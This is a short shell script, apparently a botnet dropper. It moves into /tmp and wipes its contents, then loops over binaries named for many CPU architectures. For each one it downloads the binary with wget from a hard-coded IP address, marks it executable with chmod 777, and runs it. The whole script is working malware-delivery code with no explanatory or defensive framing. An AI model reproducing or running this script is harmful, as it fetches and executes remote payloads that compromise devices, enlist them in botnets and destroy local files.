bin_names="hm_arm hm_mips hm_mipsel hm_powerpc hm_m68k hm_sh4 hm_sparc hm_x86_64 hm_i686"
http_server="52.255.173.33:89"
cd /tmp
for name in $bin_names
do
    rm -rf *
    wget http://$http_server/hm/$name
    chmod 777 $name
    ./$name
done
